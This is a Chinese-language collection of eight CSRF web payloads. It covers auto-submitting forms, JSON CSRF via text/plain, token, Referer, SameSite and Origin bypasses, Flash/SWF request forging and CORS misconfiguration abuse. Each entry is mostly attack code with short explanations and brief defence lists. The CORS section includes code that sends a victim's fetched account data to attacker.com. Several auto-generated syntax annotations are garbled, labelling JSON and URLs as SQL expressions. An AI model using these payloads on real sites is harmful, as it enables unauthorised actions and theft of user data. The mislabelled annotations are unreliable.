# CSRF跨站请求伪造

_8 条 web payload_

### CSRF基础攻击  `csrf-basic`
_跨站请求伪造基础攻击技术_
子类：**基础攻击** · tags: `csrf` `cross-site` `request` `forgery`

**前置条件：**
- 目标存在敏感操作
- 缺少CSRF保护

**攻击链：**

**1. 构造CSRF表单**
> 构造自动提交的CSRF表单
```
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
```
**语法解析：**
- `action` — 目标URL _value_
- `hidden` — 隐藏字段 _value_
- `submit()` — 自动提交表单 _function_

**2. GET请求CSRF**
> GET请求的CSRF攻击
```
<img src="http://target.com/delete?id=123" style="display:none">
或直接诱导用户点击:
http://target.com/delete?id=123
```
**语法解析：**
- `<img src>` — 图片标签自动请求 _tag_

**3. JSON CSRF**
> JSON格式的CSRF攻击
```
<script>
fetch("http://target.com/api/change-email", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```
**语法解析：**
- `credentials: "include"` — 包含Cookie _value_
- `text/plain` — 绕过预检请求 _value_

**4. 链接诱导**
> 诱导用户点击
```
<a href="http://target.com/action?param=value">点击领取红包</a>
或短链接隐藏真实URL
```
**语法解析：**
- `<a` — 命令/关键字 _command_

**WAF/EDR 绕过变体：**

**Referer绕过**
> 绕过Referer检查
```
使用Referrer Policy:
<meta name="referrer" content="no-referrer">
或使用data URL:
<data:text/html;base64,CSRF_PAYLOAD>
或使用HTTPS->HTTP降级
```
**语法解析：**
- `no-referrer` — 不发送Referer头 _value_

**Token绕过**
> 绕过Token验证
```
1. 检查Token是否可预测
2. 检查Token是否绑定会话
3. 检查Token是否在GET参数中泄露
4. 检查是否有Token重放漏洞
```
**语法解析：**
- `1.` — 命令/载荷起始 _command_
- ` 检查Token是否可预测
2. 检查Token是否绑定会话
3. 检查Token是否在GET参数中泄露
4. 检查是否有Token重放漏洞` — 参数与载荷内容 _value_


**概述：** CSRF(Cross-Site Request Forgery)跨站请求伪造利用浏览器自动携带Cookie的特性，诱导已认证用户在不知情的情况下执行攻击者预设的操作(如转账、修改密码、更改邮箱等)。

**漏洞原理：** CSRF漏洞存在于缺乏请求来源验证的敏感操作中。浏览器在发送同站请求时自动附带Cookie，攻击者构造包含恶意表单/请求的页面，受害者访问后浏览器自动以其身份发送请求。关键条件：操作仅依赖Cookie认证、无CSRF Token验证。

**利用方法：** 完整利用流程：
1. 找到敏感操作
2. 分析请求格式
3. 构造恶意页面
4. 诱导受害者访问
5. 自动执行恶意请求

**防御措施：** 防御措施：
1. 使用CSRF Token
2. 验证Referer头
3. 使用SameSite Cookie属性
4. 关键操作要求二次验证

---

### JSON CSRF攻击  `csrf-json`
_针对JSON请求的CSRF攻击技术_
子类：**JSON CSRF** · tags: `csrf` `json` `api` `post`

**前置条件：**
- 目标使用JSON格式请求
- 缺少CSRF保护
- CORS配置不当

**攻击链：**

**1. 简单JSON CSRF**
> 使用text/plain绕过预检
```
<script>
fetch("http://target.com/api/update", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({email: "attacker@evil.com"})
});
</script>
```
**语法解析：**
- `fetch()` — 发起HTTP请求 _function_
- `credentials: "include"` — 包含Cookie _value_
- `text/plain` — 绕过CORS预检 _value_

**2. Flash JSON CSRF**
> 使用Flash发送JSON
```
# 使用Flash发送JSON请求
# 需要目标允许Content-Type: application/json
# 配合Flash的跨域能力
```
**语法解析：**
- `Content-Type` — 内容类型头 _header_

**3. XSSI攻击**
> 跨站脚本包含攻击
```
# 利用JSONP回调
<script src="http://target.com/api/data?callback=attacker"></script>
function attacker(data) { console.log(data); }

# 利用数组返回
[{"secret": "data"}]
<script>var data = [{"secret": "data"}];</script>
```
**语法解析：**
- `JSONP` — JSON with Padding _value_
- `callback` — 回调函数名 _value_

**4. SWF文件攻击**
> 使用SWF文件
```
# 创建恶意SWF文件发送JSON请求
# 编译ActionScript代码
# 嵌入HTML页面
```

**WAF/EDR 绕过变体：**

**修改Content-Type**
> 修改Content-Type绕过
```
# 尝试不同的Content-Type
text/plain
application/x-www-form-urlencoded
application/x-www-form-urlencoded; charset=UTF-8
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 尝试不同的Content-Type
text/plain
application/x-www-form-urlencoded
application/x-www-form-urlencoded; charset=UTF-8` — 参数与载荷内容 _value_

**使用FormData**
> 使用FormData发送
```
let formData = new FormData();
formData.append("data", JSON.stringify({email: "attacker@evil.com"}));
fetch(url, {method: "POST", body: formData, credentials: "include"});
```
**语法解析：**
- `fetch()` — 网络请求 _function_


**概述：** JSON CSRF攻击针对接收JSON格式数据的API接口，虽然Content-Type: application/json通常触发预检请求(CORS保护)，但存在多种绕过技术使攻击成为可能。

**漏洞原理：** JSON CSRF的绕过方式：1)使用text/plain类型发送JSON格式数据(某些后端仍解析) 2)利用Flash发送自定义Content-Type(旧浏览器) 3)使用fetch API配合宽松CORS策略 4)Navigator.sendBeacon()发送POST请求。

**利用方法：** 完整利用流程：
1. 分析目标API请求格式
2. 确认CORS配置
3. 构造JSON payload
4. 使用text/plain绕过预检
5. 诱导用户触发

**防御措施：** 防御措施：
1. 验证Content-Type
2. 使用CSRF Token
3. 配置正确的CORS
4. 验证Origin头

---

### CSRF绕过技术  `csrf-bypass`
_绕过CSRF防护的各种技术_
子类：**绕过技术** · tags: `csrf` `bypass` `token` `referer`

**前置条件：**
- 目标存在CSRF防护
- 防护机制存在缺陷

**攻击链：**

**1. Token验证绕过**
> 绕过Token验证
```
# Token可预测
分析Token生成规律，预测有效Token

# Token未绑定会话
使用其他用户的Token

# Token重用
同一个Token可多次使用

# Token在GET参数中泄露
从页面源码获取Token
```
**语法解析：**
- `Token可预测` — Token有规律可循 _value_
- `Token未绑定` — Token与会话无关 _value_

**2. Referer验证绕过**
> 绕过Referer验证
```
# 正则匹配不严谨
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/

# 空Referer
<meta name="referrer" content="no-referrer">

# HTTPS->HTTP降级
从HTTPS站点跳转到HTTP不发送Referer
```
**语法解析：**
- `正则绕过` — 利用正则匹配缺陷 _value_
- `no-referrer` — 不发送Referer _value_

**3. Origin验证绕过**
> 绕过Origin验证
```
# Origin为null
使用data URL或about:blank

# 正则绕过
Origin: http://target.com.attacker.com
Origin: http://attacktarget.com

# IE11不发送Origin
IE11在某些情况下不发送Origin头
```

**4. SameSite绕过**
> 绕过SameSite限制
```
# SameSite=Lax
GET请求会发送Cookie
构造GET形式的敏感操作

# SameSite未设置
默认行为可能允许跨站发送

# 两分钟窗口
SameSite=Lax有2分钟窗口期
```
**语法解析：**
- `SameSite=Lax` — GET请求允许Cookie _value_
- `2分钟窗口` — Lax模式的宽限期 _value_

**WAF/EDR 绕过变体：**

**CORS配置错误**
> 利用CORS配置错误
```
# Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Access-Control-Allow-Origin: *
允许任意源

# 反射Origin
Access-Control-Allow-Origin: [任意Origin]
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Access-Control-Allow-Origin: *
允许任意源

# 反射Origin
Access-Control-Allow-Origin: [任意Origin]` — 参数与载荷内容 _value_


**概述：** CSRF防护绕过技术针对各种不完善的Token实现，包括Token值可预测、Token未绑定会话、静态Token重用、仅验证Token存在性(不验证值)等常见缺陷。

**漏洞原理：** CSRF Token绕过的常见场景：1)删除Token参数后服务器不验证 2)使用空值Token通过验证 3)Token未与Session绑定(可使用攻击者自己的Token) 4)Token可通过XSS窃取 5)Referer验证用正则可被绕过。

**利用方法：** 完整利用流程：
1. 分析CSRF防护机制
2. 找到验证缺陷
3. 构造绕过payload
4. 执行CSRF攻击

**防御措施：** 防御措施：
1. 使用安全的Token机制
2. Token绑定会话
3. 严格验证Referer/Origin
4. 使用SameSite=Strict

---

### SameSite绕过技术  `csrf-samesite`
_绕过SameSite Cookie属性的CSRF攻击_
子类：**SameSite绕过** · tags: `csrf` `samesite` `cookie` `bypass`

**前置条件：**
- Cookie设置了SameSite属性
- SameSite配置存在缺陷

**攻击链：**

**1. SameSite=Lax绕过**
> 绕过SameSite=Lax
```
# GET请求绕过
构造GET形式的敏感操作
<img src="http://target.com/delete?id=123">

# 顶级导航
<a href="http://target.com/action">点击</a>
window.location = "http://target.com/action"

# 两分钟窗口
在用户交互后2分钟内发起请求
```
**语法解析：**
- `GET请求` — Lax允许GET携带Cookie _value_
- `顶级导航` — Lax允许顶级导航 _value_
- `2分钟窗口` — 用户交互后的宽限期 _value_

**2. SameSite=Strict绕过**
> 绕过SameSite=Strict
```
# 子域名攻击
从子域名发起请求
http://sub.target.com/attack

# Cookie覆盖
设置同名Cookie覆盖
Set-Cookie: session=attacker; Domain=.target.com

# 利用重定向
从目标站点重定向到攻击页面
```

**3. 未设置SameSite**
> 利用未设置SameSite
```
# 旧浏览器默认行为
Chrome < 80 默认None
Safari 默认None

# 可直接发起CSRF攻击
无需特殊绕过
```

**4. 利用OAuth流程**
> 利用OAuth流程
```
# OAuth回调绕过SameSite
1. 发起OAuth登录
2. 在回调中注入恶意请求
3. Cookie在OAuth流程中发送
```

**WAF/EDR 绕过变体：**

**混合内容**
> 利用混合内容
```
# HTTPS->HTTP降级
从HTTPS站点发起HTTP请求
某些情况下不发送SameSite
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` HTTPS->HTTP降级
从HTTPS站点发起HTTP请求
某些情况下不发送SameSite` — 参数与载荷内容 _value_

**客户端重定向**
> 客户端重定向
```
# JavaScript重定向
location.href = "http://target.com/action"
可能绕过某些SameSite检查
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` JavaScript重定向
location.href = "http://target.com/action"
可能绕过某些SameSite检查` — 参数与载荷内容 _value_


**概述：** SameSite Cookie属性是浏览器层面的CSRF防御机制，但配置不当(如SameSite=None)或使用GET请求触发状态变更操作时仍可被绕过，需要结合其他防御措施。

**漏洞原理：** SameSite绕过场景：1)SameSite=Lax下GET请求仍携带Cookie(针对GET方法的状态变更) 2)SameSite=None配置错误 3)子域名间Cookie共享 4)通过window.open/top-level导航绕过Lax限制 5)旧浏览器不支持SameSite属性。

**利用方法：** 完整利用流程：
1. 确定SameSite配置
2. 选择合适的绕过方法
3. 构造GET请求或利用窗口期
4. 执行CSRF攻击

**防御措施：** 防御措施：
1. 使用SameSite=Strict
2. 配合CSRF Token
3. 关键操作使用POST
4. 验证请求来源

---

### Token绕过技术  `csrf-token-bypass`
_绕过CSRF Token验证的技术_
子类：**Token绕过** · tags: `csrf` `token` `bypass` `predictable`

**前置条件：**
- 目标使用CSRF Token
- Token机制存在缺陷

**攻击链：**

**1. Token可预测**
> 预测Token值
```
# 分析Token生成规律
# 常见弱Token模式:
- 时间戳
- 递增数字
- 用户ID哈希
- 弱随机数

# 预测并构造有效Token
```
**语法解析：**
- `时间戳` — 基于时间的Token _value_
- `递增数字` — 可预测的序列 _value_

**2. Token未绑定会话**
> 利用未绑定Token
```
# Token不验证会话
# 攻击步骤:
1. 攻击者获取自己的Token
2. 使用该Token构造CSRF
3. 诱使受害者提交

# Token可跨用户使用
```

**3. Token泄露**
> 利用Token泄露
```
# Token在URL中泄露
http://target.com/page?token=xxx

# Token在Referer中泄露
从包含Token的页面跳转

# Token在日志中泄露
服务器日志记录Token
```
**语法解析：**
- `URL泄露` — Token出现在URL中 _value_
- `Referer泄露` — 通过Referer头泄露 _value_

**4. Token重放**
> Token重放攻击
```
# Token可重复使用
# 攻击步骤:
1. 获取有效Token
2. 多次使用同一Token
3. Token不过期或不失效
```

**5. Token删除绕过**
> 删除Token绕过
```
# 尝试删除Token参数
POST /action HTTP/1.1
# 不发送Token参数

# 尝试空Token
POST /action?token=

# 尝试删除Token头
```

**WAF/EDR 绕过变体：**

**方法覆盖**
> 方法覆盖绕过
```
# 使用_method参数
POST /action?_method=PUT&token=xxx

# 使用X-HTTP-Method-Override
X-HTTP-Method-Override: PUT
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 使用_method参数
POST /action?_method=PUT&token=xxx

# 使用X-HTTP-Method-Override
X-HTTP-Method-Override: PUT` — 参数与载荷内容 _value_

**JSON格式**
> JSON格式绕过
```
# 使用JSON格式提交
Content-Type: application/json
{"token": "xxx", "action": "delete"}

# 可能绕过Token验证
```
**语法解析：**
- `# 使用JSON格式提交
Content-Type: application/json
{"token": "xxx", "action": "` — SQL表达式 _value_
- `delete` — SQL关键字 _keyword_
- `"}

# 可能绕过Token验证` — SQL表达式 _value_


**概述：** CSRF Token绕过是最常见的CSRF防护绕过方式，通过分析Token生成算法、利用实现缺陷或结合其他漏洞(如XSS)来获取或预测有效的Token值。

**漏洞原理：** CSRF Token实现缺陷包括：Token使用简单算法生成(如MD5(时间戳))可预测、Token在Cookie和表单中不一致但均被接受、Token未在服务端验证仅做前端校验、Token在URL参数中泄露(Referer头)、Token长度过短可爆破。

**利用方法：** 完整利用流程：
1. 分析Token生成机制
2. 检查Token绑定关系
3. 尝试预测或获取Token
4. 构造CSRF攻击

**防御措施：** 防御措施：
1. 使用强随机Token
2. Token绑定会话
3. Token一次性使用
4. 验证Token存在性

---

### Referer绕过技术  `csrf-referer-bypass`
_绕过Referer验证的CSRF攻击_
子类：**Referer绕过** · tags: `csrf` `referer` `bypass` `header`

**前置条件：**
- 目标验证Referer头
- 验证逻辑存在缺陷

**攻击链：**

**1. 正则匹配绕过**
> 利用正则匹配缺陷
```
# 正则只检查包含
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/
Referer: http://attacktarget.com/

# 正则只检查开头
Referer: http://target.com.attacker.com/

# 正则只检查结尾
Referer: http://attacker.com/target.com
```
**语法解析：**
- `包含匹配` — 只检查是否包含域名 _value_
- `开头匹配` — 只检查开头 _value_
- `结尾匹配` — 只检查结尾 _value_

**2. 空Referer绕过**
> 发送空Referer
```
# 不发送Referer
<meta name="referrer" content="no-referrer">

# data URL
data:text/html,<script>CSRF</script>

# about:blank
about:blank

# HTTPS->HTTP降级
从HTTPS站点跳转到HTTP
```
**语法解析：**
- `no-referrer` — 浏览器不发送Referer _value_
- `data URL` — data协议无源 _value_

**3. 子域名绕过**
> 利用子域名
```
# 从子域名发起
Referer: http://sub.target.com/attack

# 从兄弟域名发起
Referer: http://sibling.target.com/

# 利用子域名XSS
在子域名注入XSS发起CSRF
```

**4. Referrer-Policy利用**
> 利用Referrer-Policy
```
# origin-only
<meta name="referrer" content="origin">
Referer: http://target.com

# origin-when-cross-origin
<meta name="referrer" content="origin-when-cross-origin">
```

**WAF/EDR 绕过变体：**

**iframe嵌入**
> iframe绕过
```
# 使用iframe嵌入目标
<iframe src="http://target.com" referrerpolicy="no-referrer">

# sandbox属性
<iframe sandbox="allow-scripts" src="...">
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 使用iframe嵌入目标
<iframe src="http://target.com" referrerpolicy="no-referrer">

# sandbox属性
<iframe sandbox="allow-scripts" src="...">` — 参数与载荷内容 _value_

**Flash/SWF**
> Flash控制Referer
```
# Flash可以控制Referer
# 编译SWF发送自定义Referer
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` Flash可以控制Referer
# 编译SWF发送自定义Referer` — 参数与载荷内容 _value_


**概述：** Referer验证是CSRF防御的补充手段，但由于Referer头可被操纵或省略，基于Referer的防护通常不够可靠。多种技术可绕过不严格的Referer验证逻辑。

**漏洞原理：** Referer绕过技术：1)使用Referrer-Policy: no-referrer不发送Referer头 2)HTTPS→HTTP降级不携带Referer 3)data: URI不发送Referer 4)正则匹配缺陷(如target.com.evil.com) 5)子域名绕过(sub.target.com)。

**利用方法：** 完整利用流程：
1. 分析Referer验证逻辑
2. 构造绕过域名
3. 使用空Referer
4. 执行CSRF攻击

**防御措施：** 防御措施：
1. 严格验证Referer格式
2. 拒绝空Referer
3. 使用白名单验证
4. 配合CSRF Token

---

### Flash CSRF攻击  `csrf-flash`
_利用Flash进行CSRF攻击_
子类：**Flash CSRF** · tags: `csrf` `flash` `swf` `crossdomain`

**前置条件：**
- 目标允许Flash请求
- crossdomain.xml配置不当

**攻击链：**

**1. crossdomain.xml利用**
> 检查跨域策略文件
```
# 检查crossdomain.xml
http://target.com/crossdomain.xml

# 允许所有域
<cross-domain-policy>
<allow-access-from domain="*"/>
</cross-domain-policy>

# 允许特定域
<allow-access-from domain="*.target.com"/>
```
**语法解析：**
- `crossdomain.xml` — Flash跨域策略文件 _path_
- `allow-access-from` — 允许访问的域 _value_

**2. 创建恶意SWF**
> 创建恶意Flash文件
```
// ActionScript代码
package {
  import flash.net.*;
  public class CSRF {
    public function CSRF() {
      var req:URLRequest = new URLRequest("http://target.com/api/action");
      req.method = URLRequestMethod.POST;
      req.data = "param=value";
      req.requestHeaders.push(new URLRequestHeader("Content-Type", "application/json"));
      sendToURL(req);
    }
  }
}
```
**语法解析：**
- `URLRequest` — Flash HTTP请求类 _value_
- `sendToURL` — 发送请求 _value_

**3. 发送JSON请求**
> 发送JSON格式请求
```
// Flash可以发送任意Content-Type
req.requestHeaders.push(
  new URLRequestHeader("Content-Type", "application/json")
);
req.data = JSON.stringify({email: "attacker@evil.com"});
```
**语法解析：**
- `Content-Type` — 内容类型头 _header_

**4. 自定义Header**
> 添加自定义Header
```
// Flash可以添加自定义Header
req.requestHeaders.push(
  new URLRequestHeader("X-Custom-Header", "value")
);

// 绕过某些Header验证
```
**语法解析：**
- `//` — 命令/关键字 _command_

**WAF/EDR 绕过变体：**

**绕过预检请求**
> 绕过CORS预检
```
# Flash可以绕过CORS预检
# 直接发送POST请求
# 携带Cookie
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` Flash可以绕过CORS预检
# 直接发送POST请求
# 携带Cookie` — 参数与载荷内容 _value_


**概述：** Flash CSRF利用Adobe Flash的跨域请求能力发送自定义Content-Type的HTTP请求，虽然Flash已于2020年末停止支持，但了解此技术对理解CSRF攻击演变仍有价值。

**漏洞原理：** Flash CSRF的原理：SWF文件可通过URLRequest发送自定义Content-Type(如application/json)的跨域请求，绕过浏览器HTML表单的Content-Type限制。需目标域的crossdomain.xml配置允许跨域，或利用307重定向转发请求。

**利用方法：** 完整利用流程：
1. 检查crossdomain.xml
2. 创建恶意SWF
3. 嵌入HTML页面
4. 诱导用户访问

**防御措施：** 防御措施：
1. 配置严格的crossdomain.xml
2. 使用CSRF Token
3. 验证Origin/Referer
4. 禁用Flash支持

---

### CORS配置错误利用  `csrf-cors`
_利用CORS配置错误进行CSRF攻击_
子类：**CORS配置错误** · tags: `csrf` `cors` `misconfiguration` `api`

**前置条件：**
- CORS配置错误
- 允许跨域携带凭证

**攻击链：**

**1. 检测CORS配置**
> 检测CORS配置
```
# 发送测试请求
curl -H "Origin: http://attacker.com" http://target.com/api

# 检查响应头
Access-Control-Allow-Origin: http://attacker.com
Access-Control-Allow-Credentials: true

# 危险配置
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
**语法解析：**
- `Access-Control-Allow-Origin` — 允许的源 _value_
- `Access-Control-Allow-Credentials` — 允许携带凭证 _value_

**2. 反射Origin攻击**
> 利用反射Origin
```
# 服务器反射任意Origin
Access-Control-Allow-Origin: [请求的Origin]
Access-Control-Allow-Credentials: true

# 攻击代码
fetch("http://target.com/api/sensitive", {
  credentials: "include"
})
.then(r => r.json())
.then(data => sendToAttacker(data));
```
**语法解析：**
- `fetch()` — 网络请求 _function_

**3. null源攻击**
> 利用null源
```
# 允许null源
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# 使用data URL
<iframe src="data:text/html,<script>
fetch('http://target.com/api', {credentials: 'include'})
.then(r => r.json()).then(sendToAttacker);
</script>"></iframe>
```
**语法解析：**
- `null` — data URL的Origin为null _keyword_

**4. 正则绕过**
> 正则匹配绕过
```
# 正则匹配不严谨
允许: target.com
绕过: attacktarget.com
target.com.attacker.com

# 攻击代码
fetch("http://target.com.api.attacker.com/api", {
  credentials: "include"
});
```
**语法解析：**
- `fetch()` — 网络请求 _function_

**WAF/EDR 绕过变体：**

**窃取敏感数据**
> 窃取用户数据
```
# 利用CORS窃取数据
fetch("http://target.com/api/user", {
  credentials: "include"
})
.then(r => r.json())
.then(data => {
  new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(JSON.stringify(data));
});
```
**语法解析：**
- `# 利用CORS窃取数据
fetch("http://target.com/api/user", {
  credentials: "include"
}` — 攻击载荷 _value_

**执行敏感操作**
> 执行敏感操作
```
# 利用CORS执行操作
fetch("http://target.com/api/delete", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({id: 123})
});
```
**语法解析：**
- `# 利用CORS执行操作
fetch("http://target.com/api/` — SQL表达式 _value_
- `delete` — SQL关键字 _keyword_
- `", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({id: 123})
});` — SQL表达式 _value_


**概述：** CORS(Cross-Origin Resource Sharing)配置错误可被利用来绕过同源策略的CSRF防护，特别是当Access-Control-Allow-Origin反射请求的Origin头或配置为通配符时。

**漏洞原理：** CORS相关CSRF风险：1)Access-Control-Allow-Origin反射任意Origin 2)配合Access-Control-Allow-Credentials: true泄露认证数据 3)内网域名在白名单中可从内网发起攻击 4)null Origin在白名单中(iframe sandbox可伪造)。

**利用方法：** 完整利用流程：
1. 检测CORS配置
2. 确认允许凭证
3. 构造跨域请求
4. 窃取数据或执行操作

**防御措施：** 防御措施：
1. 使用白名单验证Origin
2. 不反射Origin
3. 谨慎设置Credentials
4. 使用SameSite Cookie

---
